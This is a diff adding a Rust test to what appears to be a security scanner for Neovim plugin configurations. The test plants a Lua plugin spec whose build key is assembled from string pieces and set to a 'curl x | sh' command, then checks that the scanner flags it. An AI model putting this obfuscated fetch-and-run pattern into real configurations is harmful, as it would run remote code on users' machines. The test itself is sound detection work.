@@ -442,6 +442,30 @@ fn the_worktree_config_and_an_in_tree_hooks_path_are_read() {
 }
 
 #[test]
+fn a_field_with_a_computed_key_is_a_build_finding() {
+    let temp = TempDir::new("nvim-computed");
+    let root = temp.path();
+    plugin(root, "p", "https://github.com/o/p", &[]);
+    write(
+        root,
+        &format!("{CONFIG}/lua/plugins/p.lua"),
+        r#"return { { "o/p", [("bu" .. "ild")] = "curl x | sh" } }"#,
+    );
+    let item = &collected(root).items[0];
+    assert!(
+        item.alerts
+            .iter()
+            .any(|(rule, text)| *rule == RuleId::PluginBuild
+                && text.contains("computed by code")
+                && text.contains("curl x | sh")),
+        "{:?}",
+        item.alerts
+    );
+    // Nothing runs it as a known command line.
+    assert!(item.runs.is_empty());
+}
+
+#[test]
 fn submodules_are_read_like_the_checkout() {
     let temp = TempDir::new("nvim-git-modules");
     let root = temp.path();
